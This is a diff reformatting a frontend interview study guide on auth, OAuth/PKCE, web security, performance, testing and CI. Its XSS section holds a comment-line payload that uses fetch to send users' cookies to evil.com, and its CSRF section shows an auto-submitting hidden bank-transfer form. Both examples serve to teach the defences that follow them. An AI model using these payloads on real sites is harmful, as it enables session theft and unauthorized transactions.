-await apiFetch<User>('/api/users', {
-  method: 'POST',
-  body: JSON.stringify({ name: 'Alice', email: 'alice@example.com' }),
+await apiFetch<User>("/api/users", {
+  method: "POST",
+  body: JSON.stringify({ name: "Alice", email: "alice@example.com" }),
 });
 ```
 
@@ -1200,17 +1301,17 @@ await apiFetch<User>('/api/users', {
 
 #### Storage tradeoffs
 
-| Location | XSS Risk | CSRF Risk | Notes |
-|---|---|---|---|
-| `localStorage` | High | None | JS can read it â€” avoid for sensitive tokens |
-| `sessionStorage` | High | None | Cleared on tab close, still readable by JS |
-| `httpOnly` cookie | None | Moderate | Cannot be read by JS â€” safest option |
-| `httpOnly` cookie + `SameSite=Strict` | None | None | Best practice |
+| Location                              | XSS Risk | CSRF Risk | Notes                                         |
+| ------------------------------------- | -------- | --------- | --------------------------------------------- |
+| `localStorage`                        | High     | None      | JS can read it â€” avoid for sensitive tokens |
+| `sessionStorage`                      | High     | None      | Cleared on tab close, still readable by JS    |
+| `httpOnly` cookie                     | None     | Moderate  | Cannot be read by JS â€” safest option        |
+| `httpOnly` cookie + `SameSite=Strict` | None     | None      | Best practice                                 |
 
 ```ts
 // Reading a JWT payload (client-side, no library needed)
 function parseJwt(token: string) {
-  const base64 = token.split('.')[1].replace(/-/g, '+').replace(/_/g, '/');
+  const base64 = token.split(".")[1].replace(/-/g, "+").replace(/_/g, "/");
   return JSON.parse(window.atob(base64));
 }
 ```
@@ -1244,13 +1345,13 @@ function parseJwt(token: string) {
 function GoogleLogin() {
   function handleLogin() {
     const state = crypto.randomUUID(); // CSRF protection
-    sessionStorage.setItem('oauth_state', state);
+    sessionStorage.setItem("oauth_state", state);
 
     const params = new URLSearchParams({
-      client_id: 'YOUR_CLIENT_ID',
-      redirect_uri: 'https://yourapp.com/callback',
-      response_type: 'code',
-      scope: 'openid email profile',
+      client_id: "YOUR_CLIENT_ID",
+      redirect_uri: "https://yourapp.com/callback",
+      response_type: "code",
+      scope: "openid email profile",
       state,
     });
 
@@ -1265,25 +1366,25 @@ function GoogleLogin() {
 
 ```ts
 // GET /callback?code=...&state=...
-app.get('/callback', async (req, res) => {
+app.get("/callback", async (req, res) => {
   const { code, state } = req.query;
 
   // 1. Validate state to prevent CSRF
   const savedState = req.session.oauth_state;
   if (!state || state !== savedState) {
-    return res.status(400).send('Invalid state parameter');
+    return res.status(400).send("Invalid state parameter");
   }
 
   // 2. Exchange code for tokens
-  const tokenResponse = await fetch('https://oauth2.googleapis.com/token', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+  const tokenResponse = await fetch("https://oauth2.googleapis.com/token", {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: new URLSearchParams({
       code: code as string,
       client_id: process.env.GOOGLE_CLIENT_ID!,
       client_secret: process.env.GOOGLE_CLIENT_SECRET!, // NEVER send to frontend
-      redirect_uri: 'https://yourapp.com/callback',
-      grant_type: 'authorization_code',
+      redirect_uri: "https://yourapp.com/callback",
+      grant_type: "authorization_code",
     }),
   });
 
@@ -1291,9 +1392,12 @@ app.get('/callback', async (req, res) => {
   // { access_token, refresh_token, expires_in, token_type, id_token }
 
   // 3. Fetch user info
-  const userResponse = await fetch('https://www.googleapis.com/oauth2/v2/userinfo', {
-    headers: { Authorization: `Bearer ${tokens.access_token}` },
-  });
+  const userResponse = await fetch(
+    "https://www.googleapis.com/oauth2/v2/userinfo",
+    {
+      headers: { Authorization: `Bearer ${tokens.access_token}` },
+    },
+  );
   const user = await userResponse.json();
   // { id, email, name, picture }
 
@@ -1310,7 +1414,7 @@ app.get('/callback', async (req, res) => {
   req.session.userId = user.id;
 
   // 6. Redirect to app
-  res.redirect('/dashboard');
+  res.redirect("/dashboard");
 });
 ```
 
@@ -1318,14 +1422,14 @@ app.get('/callback', async (req, res) => {
 
 ```ts
 async function refreshAccessToken(refreshToken: string) {
-  const response = await fetch('https://oauth2.googleapis.com/token', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+  const response = await fetch("https://oauth2.googleapis.com/token", {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: new URLSearchParams({
       refresh_token: refreshToken,
       client_id: process.env.GOOGLE_CLIENT_ID!,
       client_secret: process.env.GOOGLE_CLIENT_SECRET!,
-      grant_type: 'refresh_token',
+      grant_type: "refresh_token",
     }),
   });
 
@@ -1339,13 +1443,13 @@ async function refreshAccessToken(refreshToken: string) {
 
 #### Common pitfalls
 
-| Mistake | Why it's bad | Correct approach |
-|---|---|---|
-| Exposing `client_secret` in frontend | Anyone can impersonate your app | Keep it server-side only |
-| Not validating `state` parameter | Vulnerable to CSRF | Generate random state, validate on callback |
-| Storing tokens in `localStorage` | XSS can steal them | Use `httpOnly` cookies or encrypted DB |
-| Not handling token expiry | API calls fail after ~1 hour | Refresh tokens before they expire |
-| Using Implicit Flow for SPAs | Deprecated, less secure | Use Authorization Code + PKCE instead |
+| Mistake                              | Why it's bad                    | Correct approach                            |
+| ------------------------------------ | ------------------------------- | ------------------------------------------- |
+| Exposing `client_secret` in frontend | Anyone can impersonate your app | Keep it server-side only                    |
+| Not validating `state` parameter     | Vulnerable to CSRF              | Generate random state, validate on callback |
+| Storing tokens in `localStorage`     | XSS can steal them              | Use `httpOnly` cookies or encrypted DB      |
+| Not handling token expiry            | API calls fail after ~1 hour    | Refresh tokens before they expire           |
+| Using Implicit Flow for SPAs         | Deprecated, less secure         | Use Authorization Code + PKCE instead       |
 
 #### PKCE (Proof Key for Code Exchange) â€” for SPAs
 
@@ -1356,39 +1460,42 @@ async function refreshAccessToken(refreshToken: string) {
 // 1. Generate code verifier and challenge
 function generatePKCE() {
   const verifier = base64UrlEncode(crypto.getRandomValues(new Uint8Array(32)));
-  const challenge = base64UrlEncode(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(verifier)));
+  const challenge = base64UrlEncode(
+    await crypto.subtle.digest("SHA-256", new TextEncoder().encode(verifier)),
+  );
   return { verifier, challenge };
 }
 
 // 2. Store verifier, send challenge in auth request
 const { verifier, challenge } = await generatePKCE();
-sessionStorage.setItem('pkce_verifier', verifier);
+sessionStorage.setItem("pkce_verifier", verifier);
 
 const params = new URLSearchParams({
-  client_id: 'YOUR_CLIENT_ID',
-  redirect_uri: 'https://yourapp.com/callback',
-  response_type: 'code',
-  scope: 'openid email',
+  client_id: "YOUR_CLIENT_ID",
+  redirect_uri: "https://yourapp.com/callback",
+  response_type: "code",
+  scope: "openid email",
   code_challenge: challenge,
-  code_challenge_method: 'S256',
+  code_challenge_method: "S256",
 });
 window.location.href = `https://provider.com/oauth/authorize?${params}`;
 
 // 3. On callback, exchange code + verifier for tokens (no client_secret needed)
-const verifier = sessionStorage.getItem('pkce_verifier');
-const tokenResponse = await fetch('https://provider.com/oauth/token', {
-  method: 'POST',
+const verifier = sessionStorage.getItem("pkce_verifier");
+const tokenResponse = await fetch("https://provider.com/oauth/token", {
+  method: "POST",
   body: new URLSearchParams({
     code: code as string,
-    client_id: 'YOUR_CLIENT_ID',
-    redirect_uri: 'https://yourapp.com/callback',
-    grant_type: 'authorization_code',
+    client_id: "YOUR_CLIENT_ID",
+    redirect_uri: "https://yourapp.com/callback",
+    grant_type: "authorization_code",
     code_verifier: verifier!,
   }),
 });
 ```
 
 **Key interview points:**
+
 - The `code` exchange happens **server-side** (or with PKCE for SPAs) â€” never expose `client_secret` to the browser.
 - Access tokens are short-lived (minutes to hours); refresh tokens are long-lived.
 - PKCE is now required for single-page apps per OAuth 2.1 spec.
@@ -1404,7 +1511,11 @@ const tokenResponse = await fetch('https://provider.com/oauth/token', {
 
 ```tsx
 // VULNERABLE: Comment system that displays user input without escaping
-function CommentList({ comments }: { comments: Array<{ author: string; text: string }> }) {
+function CommentList({
+  comments,
+}: {
+  comments: Array<{ author: string; text: string }>;
+}) {
   return (
     <ul>
       {comments.map((c, i) => (
@@ -1420,7 +1531,7 @@ function CommentList({ comments }: { comments: Array<{ author: string; text: str
 
 // Attacker submits comment:
 // "Check out my site! <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>"
-// 
+//
 // When other users view comments, the script executes in THEIR browser,
 // sending their session cookie to evil.com.
 ```
@@ -1428,7 +1539,11 @@ function CommentList({ comments }: { comments: Array<{ author: string; text: str
 **FIXED:**
 
 ```tsx
-function CommentList({ comments }: { comments: Array<{ author: string; text: string }> }) {
+function CommentList({
+  comments,
+}: {
+  comments: Array<{ author: string; text: string }>;
+}) {
   return (
     <ul>
       {comments.map((c, i) => (
@@ -1443,10 +1558,12 @@ function CommentList({ comments }: { comments: Array<{ author: string; text: str
 }
 
 // If rich text is required, sanitize with DOMPurify:
-import DOMPurify from 'dompurify';
+import DOMPurify from "dompurify";
 
 function RichComment({ html }: { html: string }) {
-  const clean = DOMPurify.sanitize(html, { ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'] });
+  const clean = DOMPurify.sanitize(html, {
+    ALLOWED_TAGS: ["b", "i", "em", "strong", "a"],
+  });
   return <div dangerouslySetInnerHTML={{ __html: clean }} />;
 }
 ```
@@ -1456,13 +1573,13 @@ function RichComment({ html }: { html: string }) {
 ```tsx
 // VULNERABLE: Search page that echoes user query without escaping
 function SearchResults() {
-  const query = new URLSearchParams(window.location.search).get('q');
-  
+  const query = new URLSearchParams(window.location.search).get("q");
+
   return (
     <div>
-      <h1>Results for: {query}</h1>  {/* Safe in React */}
+      <h1>Results for: {query}</h1> {/* Safe in React */}
       {/* DANGER: If using vanilla JS or innerHTML */}
-      <div dangerouslySetInnerHTML={{ __html: `Results for: ${query}` }} />
+      <div dangerouslySetInnerHTML={{ __html: `Results for: ` + query }} />
     </div>
   );
 }
@@ -1477,11 +1594,11 @@ function SearchResults() {
 
 ```tsx
 // React's JSX escapes by default â€” this is already safe:
-<h1>Results for: {query}</h1>
+<h1>Results for: {query}</h1>;
 
 // For vanilla JS, manually escape:
 function escapeHTML(str: string) {
-  const div = document.createElement('div');
+  const div = document.createElement("div");
   div.textContent = str;
   return div.innerHTML;
 }
@@ -1513,15 +1630,22 @@ Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
 ```html
 <!-- Attacker's website: evil.com -->
 <html>
-<body>
-  <h1>Claim your free gift!</h1>
-  <!-- Hidden form that auto-submits when page loads -->
-  <form id="attack" action="https://bank.com/transfer" method="POST" style="display:none">
-    <input name="to" value="attacker-account" />
-    <input name="amount" value="10000" />
-  </form>
-  <script>document.getElementById('attack').submit();</script>
-</body>
+  <body>
+    <h1>Claim your free gift!</h1>
+    <!-- Hidden form that auto-submits when page loads -->
+    <form
+      id="attack"
+      action="https://bank.com/transfer"
+      method="POST"
+      style="display:none"
+    >
+      <input name="to" value="attacker-account" />
+      <input name="amount" value="10000" />
+    </form>
+    <script>
+      document.getElementById("attack").submit();
+    </script>
+  </body>
 </html>
 
 <!-- If victim is logged into bank.com and visits evil.com,
@@ -1544,17 +1668,17 @@ Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
 
 ```tsx
 // Backend: Generate token per session
-app.post('/login', (req, res) => {
-  req.session.csrfToken = crypto.randomBytes(32).toString('hex');
-  res.cookie('csrf_token', req.session.csrfToken);
+app.post("/login", (req, res) => {
+  req.session.csrfToken = crypto.randomBytes(32).toString("hex");
+  res.cookie("csrf_token", req.session.csrfToken);
 });
 
 // Middleware: Validate token on state-changing requests
-app.use('/api', (req, res, next) => {
-  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
-    const tokenFromHeader = req.headers['x-csrf-token'];
+app.use("/api", (req, res, next) => {
+  if (["POST", "PUT", "DELETE"].includes(req.method)) {
+    const tokenFromHeader = req.headers["x-csrf-token"];
     if (tokenFromHeader !== req.session.csrfToken) {
-      return res.status(403).send('CSRF token mismatch');
+      return res.status(403).send("CSRF token mismatch");
     }
   }
   next();
@@ -1562,10 +1686,10 @@ app.use('/api', (req, res, next) => {
 
 // Frontend: Send token with every mutating request
 async function deleteUser(id: number) {
-  const csrfToken = getCookie('csrf_token');
+  const csrfToken = getCookie("csrf_token");
   await fetch(`/api/users/${id}`, {
-    method: 'DELETE',
-    headers: { 'X-CSRF-Token': csrfToken },
+    method: "DELETE",
+    headers: { "X-CSRF-Token": csrfToken },
   });
 }
 ```
@@ -1575,27 +1699,31 @@ async function deleteUser(id: number) {
 ```ts
 app.use((req, res, next) => {
   const origin = req.headers.origin || req.headers.referer;
-  if (origin && !origin.startsWith('https://yourapp.com')) {
-    return res.status(403).send('Invalid origin');
+  if (origin && !origin.startsWith("https://yourapp.com")) {
+    return res.status(403).send("Invalid origin");
   }
   next();
 });
 ```
 
 **Real-world impact:**
+
 - Without CSRF protection: Attacker can perform ANY action the logged-in user can (transfer money, change email, delete account)
 - With `SameSite=Strict`: Attack blocked by browser automatically
 
 #### Clickjacking
+
 Attacker embeds your site in an invisible iframe to trick users into clicking.
 
 **Mitigations:**
+
 ```http
 X-Frame-Options: DENY
 Content-Security-Policy: frame-ancestors 'none'
 ```
 
 #### Secure cookie flags
+
 ```http
 Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
 ```
@@ -1605,6 +1733,7 @@ Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
 - `SameSite=Strict` â€” not sent on cross-origin requests at all
 
 ### 4.5 References
+
 - [OWASP Top 10](https://owasp.org/www-project-top-ten/)
 - [jwt.io Introduction](https://jwt.io/introduction)
 - [OAuth 2.0 Simplified](https://www.oauth.com) â€” Authorization Code chapter
@@ -1615,18 +1744,20 @@ Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
 
 ### 5.1 Core Web Vitals
 
-| Metric | Measures | Good threshold |
-|---|---|---|
-| **LCP** (Largest Contentful Paint) | Load time of the main content | < 2.5 s |
-| **INP** (Interaction to Next Paint) | Responsiveness to user input | < 200 ms |
-| **CLS** (Cumulative Layout Shift) | Visual stability | < 0.1 |
+| Metric                              | Measures                      | Good threshold |
+| ----------------------------------- | ----------------------------- | -------------- |
+| **LCP** (Largest Contentful Paint)  | Load time of the main content | < 2.5 s        |
+| **INP** (Interaction to Next Paint) | Responsiveness to user input  | < 200 ms       |
+| **CLS** (Cumulative Layout Shift)   | Visual stability              | < 0.1          |
 
 #### What degrades LCP
+
 - Large unoptimised images (add `loading="lazy"`, use WebP, set `width`/`height`)
 - Render-blocking CSS or JS (`defer` scripts, inline critical CSS)
 - Slow server response (caching, CDN)
 
 #### What degrades CLS
+
 - Images without explicit dimensions
 - Fonts swapping after load (`font-display: swap` + preloading)
 - Dynamic content injected above existing content
@@ -1641,8 +1772,8 @@ Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
 <img
   src="/images/hero-800w.webp"
   srcset="
-    /images/hero-400w.webp 400w,
-    /images/hero-800w.webp 800w,
+    /images/hero-400w.webp   400w,
+    /images/hero-800w.webp   800w,
     /images/hero-1200w.webp 1200w
   "
   sizes="(max-width: 768px) 100vw, 800px"
@@ -1673,8 +1804,14 @@ Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
 <!-- AFTER: Inline critical CSS, defer non-critical (FCP: 0.8s) -->
 <style>
   /* Critical: Above-the-fold styles only (~10-15KB max) */
-  body { margin: 0; font-family: sans-serif; }
-  .hero { min-height: 100vh; background: #000; }
+  body {
+    margin: 0;
+    font-family: sans-serif;
+  }
+  .hero {
+    min-height: 100vh;
+    background: #000;
+  }
   /* ... */
 </style>
 
@@ -1694,8 +1831,8 @@ Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
 ```css
 /* BEFORE: Font swapping causes CLS */
 @font-face {
-  font-family: 'MyFont';
-  src: url('/fonts/myfont.woff2');
+  font-family: "MyFont";
+  src: url("/fonts/myfont.woff2");
 }
 
 /* AFTER: Preload + font-display prevents CLS */
@@ -1703,19 +1840,31 @@ Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
 ```
 
 ```html
-<link rel="preload" href="/fonts/myfont.woff2" as="font" type="font/woff2" crossorigin />
+<link
+  rel="preload"
+  href="/fonts/myfont.woff2"
+  as="font"
+  type="font/woff2"
+  crossorigin
+/>
 ```
 
 ```css
 @font-face {
-  font-family: 'MyFont';
-  src: url('/fonts/myfont.woff2');
+  font-family: "MyFont";
+  src: url("/fonts/myfont.woff2");
   font-display: swap; /* Shows fallback immediately, swaps when custom font loads */
 }
 
 /* Or use fallback font with similar metrics to avoid layout shift */
 body {
-  font-family: 'MyFont', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+  font-family:
+    "MyFont",
+    -apple-system,
+    BlinkMacSystemFont,
+    "Segoe UI",
+    Arial,
+    sans-serif;
 }
 ```
 
@@ -1725,7 +1874,7 @@ body {
 
 ```tsx
 // React.lazy + Suspense â€” only loads Dashboard when route is accessed
-const Dashboard = React.lazy(() => import('./Dashboard'));
+const Dashboard = React.lazy(() => import("./Dashboard"));
 
 function App() {
   return (
@@ -1739,16 +1888,16 @@ function App() {
 #### Advanced: Route-based + component-based splitting
 
 ```tsx
-import { lazy, Suspense } from 'react';
-import { BrowserRouter, Routes, Route } from 'react-router-dom';
+import { lazy, Suspense } from "react";
+import { BrowserRouter, Routes, Route } from "react-router-dom";
 
 // Route-level splitting â€” each route is a separate bundle
-const Home = lazy(() => import('./pages/Home'));
-const Dashboard = lazy(() => import('./pages/Dashboard'));
-const Profile = lazy(() => import('./pages/Profile'));
+const Home = lazy(() => import("./pages/Home"));
+const Dashboard = lazy(() => import("./pages/Dashboard"));
+const Profile = lazy(() => import("./pages/Profile"));
 
 // Component-level splitting â€” heavy components load on demand
-const HeavyChart = lazy(() => import('./components/HeavyChart'));
+const HeavyChart = lazy(() => import("./components/HeavyChart"));
 
 function App() {
   return (
@@ -1767,7 +1916,7 @@ function App() {
 // Usage in a page
 function Dashboard() {
   const [showChart, setShowChart] = useState(false);
-  
+
   return (
     <div>
       <h1>Dashboard</h1>
@@ -1797,28 +1946,31 @@ ETag: "abc123"
 
 #### Caching strategy comparison
 
-| Resource type | Cache-Control | Why |
-|---|---|---|
-| JS/CSS with hash (`main.a1b2c3.js`) | `public, max-age=31536000, immutable` | Hash changes when content changes â€” safe to cache forever |
-| Images, fonts | `public, max-age=2592000` (30 days) | Rarely change, but no hash in filename |
-| HTML | `no-cache` or `max-age=0, must-revalidate` | Always check server for updates |
-| API responses (user data) | `no-store` | Never cache sensitive data |
-| API responses (public data) | `public, max-age=300` (5 min) | Cache briefly to reduce server load |
+| Resource type                       | Cache-Control                              | Why                                                         |
+| ----------------------------------- | ------------------------------------------ | ----------------------------------------------------------- |
+| JS/CSS with hash (`main.a1b2c3.js`) | `public, max-age=31536000, immutable`      | Hash changes when content changes â€” safe to cache forever |
+| Images, fonts                       | `public, max-age=2592000` (30 days)        | Rarely change, but no hash in filename                      |
+| HTML                                | `no-cache` or `max-age=0, must-revalidate` | Always check server for updates                             |
+| API responses (user data)           | `no-store`                                 | Never cache sensitive data                                  |
+| API responses (public data)         | `public, max-age=300` (5 min)              | Cache briefly to reduce server load                         |
 
 ```ts
 // Backend: Set cache headers (Express example)
-app.use('/static', express.static('public', {
-  maxAge: '1y', // 1 year for static assets
-  immutable: true,
-}));
+app.use(
+  "/static",
+  express.static("public", {
+    maxAge: "1y", // 1 year for static assets
+    immutable: true,
+  }),
+);
 
-app.get('/api/products', (req, res) => {
-  res.set('Cache-Control', 'public, max-age=300'); // 5 minutes
+app.get("/api/products", (req, res) => {
+  res.set("Cache-Control", "public, max-age=300"); // 5 minutes
   res.json(products);
 });
 
-app.get('/api/user/profile', (req, res) => {
-  res.set('Cache-Control', 'no-store'); // Never cache
+app.get("/api/user/profile", (req, res) => {
+  res.set("Cache-Control", "no-store"); // Never cache
   res.json(userProfile);
 });
 ```
@@ -1835,20 +1987,20 @@ Memory leaks cause increasing memory usage over time, leading to slow performanc
 // LEAK â€” setInterval keeps running after component unmounts
 function BadTimer() {
   useEffect(() => {
-    const id = setInterval(() => console.log('tick'), 1000);
+    const id = setInterval(() => console.log("tick"), 1000);
     // forgot return! Interval runs forever even after component is gone
   }, []);
-  
+
   return <div>Timer</div>;
 }
 
 // FIXED
 function GoodTimer() {
   useEffect(() => {
-    const id = setInterval(() => console.log('tick'), 1000);
+    const id = setInterval(() => console.log("tick"), 1000);
     return () => clearInterval(id); // cleanup on unmount
   }, []);
-  
+
   return <div>Timer</div>;
 }
 ```
@@ -1860,10 +2012,10 @@ function GoodTimer() {
 function BadResizeHandler() {
   useEffect(() => {
     const handleResize = () => console.log(window.innerWidth);
-    window.addEventListener('resize', handleResize);
+    window.addEventListener("resize", handleResize);
     // forgot to remove! Listener stays forever
   }, []);
-  
+
   return <div>Resize handler</div>;
 }
 
@@ -1871,10 +2023,10 @@ function BadResizeHandler() {
 function GoodResizeHandler() {
   useEffect(() => {
     const handleResize = () => console.log(window.innerWidth);
-    window.addEventListener('resize', handleResize);
-    return () => window.removeEventListener('resize', handleResize);
+    window.addEventListener("resize", handleResize);
+    return () => window.removeEventListener("resize", handleResize);
   }, []);
-  
+
   return <div>Resize handler</div>;
 }
 ```
@@ -1885,28 +2037,28 @@ function GoodResizeHandler() {
 // LEAK â€” closure captures old state value
 function BadCounter() {
   const [count, setCount] = useState(0);
-  
+
   useEffect(() => {
     const id = setInterval(() => {
       setCount(count + 1); // Always adds to the initial count (0)
     }, 1000);
     return () => clearInterval(id);
   }, []); // Empty deps â€” count is stale
-  
+
   return <div>{count}</div>; // Stuck at 1
 }
 
 // FIXED â€” use functional update
 function GoodCounter() {
   const [count, setCount] = useState(0);
-  
+
   useEffect(() => {
     const id = setInterval(() => {
-      setCount(prev => prev + 1); // Reads latest value
+      setCount((prev) => prev + 1); // Reads latest value
     }, 1000);
     return () => clearInterval(id);
   }, []);
-  
+
   return <div>{count}</div>; // Counts correctly
 }
 ```
@@ -1917,33 +2069,33 @@ function GoodCounter() {
 // LEAK â€” fetch completes after unmount, tries to update state
 function BadUserProfile({ userId }: { userId: number }) {
   const [user, setUser] = useState(null);
-  
+
   useEffect(() => {
     fetch(`/api/users/${userId}`)
-      .then(r => r.json())
+      .then((r) => r.json())
       .then(setUser); // ERROR if component unmounted
   }, [userId]);
-  
+
   return <div>{user?.name}</div>;
 }
 
 // FIXED â€” abort controller
 function GoodUserProfile({ userId }: { userId: number }) {
   const [user, setUser] = useState(null);
-  
+
   useEffect(() => {
     const controller = new AbortController();
-    
+
     fetch(`/api/users/${userId}`, { signal: controller.signal })
-      .then(r => r.json())
+      .then((r) => r.json())
       .then(setUser)
-      .catch(err => {
-        if (err.name !== 'AbortError') console.error(err);
+      .catch((err) => {
+        if (err.name !== "AbortError") console.error(err);
       });
-    
+
     return () => controller.abort(); // cancels request on unmount
   }, [userId]);
-  
+
   return <div>{user?.name}</div>;
 }
 ```
@@ -1964,6 +2116,7 @@ function GoodUserProfile({ userId }: { userId: number }) {
 - [ ] Core Web Vitals: LCP < 2.5s, INP < 200ms, CLS < 0.1
 
 ### 5.6 References
+
 - [web.dev/vitals](https://web.dev/vitals/)
 - [web.dev/learn/performance](https://web.dev/learn/performance/)
 
@@ -1975,65 +2128,68 @@ function GoodUserProfile({ userId }: { userId: number }) {
 
 ```ts
 // sum.ts
-export function sum(a: number, b: number) { return a + b; }
+export function sum(a: number, b: number) {
+  return a + b;
+}
 
 // sum.test.ts
-import { sum } from './sum';
+import { sum } from "./sum";
 
-describe('sum', () => {
-  it('adds two positive numbers', () => {
+describe("sum", () => {
+  it("adds two positive numbers", () => {
     expect(sum(2, 3)).toBe(5);
   });
 
-  it('handles negative numbers', () => {
+  it("handles negative numbers", () => {
     expect(sum(-1, 1)).toBe(0);
   });
 });
 ```
 
 #### Mocking
+
 ```ts
 // Mock a module
-jest.mock('./api', () => ({
-  fetchUser: jest.fn().mockResolvedValue({ id: 1, name: 'Alice' }),
+jest.mock("./api", () => ({
+  fetchUser: jest.fn().mockResolvedValue({ id: 1, name: "Alice" }),
 }));
 
 // Mock a function
 const mockFn = jest.fn();
 mockFn.mockReturnValue(42);
-expect(mockFn).toHaveBeenCalledWith('arg');
+expect(mockFn).toHaveBeenCalledWith("arg");
 expect(mockFn).toHaveBeenCalledTimes(1);
 ```
 
 ### 6.2 React Testing Library â€” component testing
 
 ```tsx
-import { render, screen, fireEvent, waitFor } from '@testing-library/react';
-import userEvent from '@testing-library/user-event';
-import LoginForm from './LoginForm';
+import { render, screen, fireEvent, waitFor } from "@testing-library/react";
+import userEvent from "@testing-library/user-event";
+import LoginForm from "./LoginForm";
 
-describe('LoginForm', () => {
-  it('shows validation error for invalid email', async () => {
+describe("LoginForm", () => {
+  it("shows validation error for invalid email", async () => {
     render(<LoginForm />);
-    
-    await userEvent.type(screen.getByLabelText(/email/i), 'notanemail');
-    await userEvent.click(screen.getByRole('button', { name: /log in/i }));
 
-    expect(screen.getByRole('alert')).toHaveTextContent(/valid email/i);
+    await userEvent.type(screen.getByLabelText(/email/i), "notanemail");
+    await userEvent.click(screen.getByRole("button", { name: /log in/i }));
+
+    expect(screen.getByRole("alert")).toHaveTextContent(/valid email/i);
   });
 
-  it('calls onSubmit with form data', async () => {
+  it("calls onSubmit with form data", async () => {
     const onSubmit = jest.fn();
     render(<LoginForm onSubmit={onSubmit} />);
 
-    await userEvent.type(screen.getByLabelText(/email/i), 'alice@example.com');
-    await userEvent.type(screen.getByLabelText(/password/i), 'password123');
-    await userEvent.click(screen.getByRole('button', { name: /log in/i }));
+    await userEvent.type(screen.getByLabelText(/email/i), "alice@example.com");
+    await userEvent.type(screen.getByLabelText(/password/i), "password123");
+    await userEvent.click(screen.getByRole("button", { name: /log in/i }));
 
     await waitFor(() => {
       expect(onSubmit).toHaveBeenCalledWith({
-        email: 'alice@example.com',
-        password: 'password123',
+        email: "alice@example.com",
+        password: "password123",
       });
     });
   });
@@ -2041,10 +2197,12 @@ describe('LoginForm', () => {
 ```
 
 **Key RTL philosophy:** Query by what the user sees, not implementation details.
+
 - Prefer `getByRole`, `getByLabelText`, `getByText` over `getByTestId`
 - Test behavior, not internals (don't test state variables directly)
 
 ### 6.3 References
+
 - [React Testing Library docs](https://testing-library.com/docs/react-testing-library/intro/)
 - [jestjs.io/docs/getting-started](https://jestjs.io/docs/getting-started)
 
@@ -2068,6 +2226,7 @@ git rebase origin/main
 ```
 
 #### Merge vs rebase
+
 - **Merge** â€” preserves full history, adds a merge commit. Easier to understand for teams.
 - **Rebase** â€” rewrites history to be linear. Cleaner log but rewrites commits (never rebase shared branches).
 
@@ -2076,30 +2235,30 @@ git rebase origin/main
 ```yaml
 # Typical pipeline order (don't skip steps)
 stages:
-  - install          # npm ci
-  - lint             # eslint, stylelint
-  - typecheck        # tsc --noEmit
-  - test             # jest --ci --coverage
-  - build            # npm run build
-  - deploy           # push to staging/production
+  - install # npm ci
+  - lint # eslint, stylelint
+  - typecheck # tsc --noEmit
+  - test # jest --ci --coverage
+  - build # npm run build
+  - deploy # push to staging/production
 ```
 
 **Key points:**
+
 - `npm ci` (not `npm install`) in CI â€” uses exact lockfile versions, fails if lock is out of sync
 - Environment variables injected by the CI system, never committed to repo
 - `.env.local` for local dev, `.env.production` for build-time values
 
 ### 7.3 Rollback strategies
 
-| Strategy | How | When |
-|---|---|---|
-| **Redeploy previous** | Re-run previous pipeline | Fastest for most cases |
-| **Feature flags** | Toggle off the bad feature | Zero downtime, no redeploy |
-| **Blue/green** | Route traffic to stable environment | Large-scale, high-availability needs |
-| **Canary** | Gradually shift traffic | Progressive rollout safety |
+| Strategy              | How                                 | When                                 |
+| --------------------- | ----------------------------------- | ------------------------------------ |
+| **Redeploy previous** | Re-run previous pipeline            | Fastest for most cases               |
+| **Feature flags**     | Toggle off the bad feature          | Zero downtime, no redeploy           |
+| **Blue/green**        | Route traffic to stable environment | Large-scale, high-availability needs |
+| **Canary**            | Gradually shift traffic             | Progressive rollout safety           |
 
 ---
-
 
 ## Phase 8 â€” Frontend System Design for IC Interviews
 
@@ -2154,18 +2313,21 @@ Use this template for **any** "design X" question.
 Ask these questions **before** writing code:
 
 **Functional requirements:**
+
 - What is the primary user action? (search, scroll, submit, etc.)
 - What data is displayed? Where does it come from (API, local state, props)?
 - What are the success and error states?
 - Any special interactions? (keyboard nav, drag-and-drop, real-time updates)
 
 **Non-functional requirements:**
+
 - Scale: 10 items or 10,000? Does virtualization matter?
 - Performance: Any latency budgets? (e.g., search results in <300ms)
 - Accessibility: Keyboard-only users? Screen readers?
 - Browser support: Modern evergreen or legacy IE11?
 
 **Example exchange:**
+
 > Interviewer: "Design an infinite scroll feed."  
 > You: "Got it. A few clarifying questions: How many items per page? Do we paginate with offset or cursor-based? Should I handle optimistic updates if the user likes a post? Any special requirements for accessibility or SEO?"
 
@@ -2184,6 +2346,7 @@ App
 ```
 
 **Key decisions at this stage:**
+
 - Where does state live? (local, lifted, context, global store)
 - What are the component boundaries? (when to split into smaller components)
 - How does data flow? (props down, events up)
@@ -2191,6 +2354,7 @@ App
 #### Step 3: Define State & Data Flow (5 minutes)
 
 List out:
+
 - **UI state** â€” loading, error, empty, success
 - **Domain data** â€” the actual content (posts, users, products)
 - **Form state** (if applicable) â€” input values, validation errors, touched fields
@@ -2201,15 +2365,16 @@ List out:
 ```typescript
 // State structure
 type SearchState = {
-  query: string;               // controlled input value
+  query: string; // controlled input value
   results: Array<SearchResult>; // fetched data
   loading: boolean;
   error: Error | null;
-  selectedIndex: number;       // for keyboard nav
+  selectedIndex: number; // for keyboard nav
 };
 ```
 
 **Data flow:**
+
 1. User types â†’ `query` updates â†’ debounced effect triggers
 2. Effect calls API â†’ `loading` = true
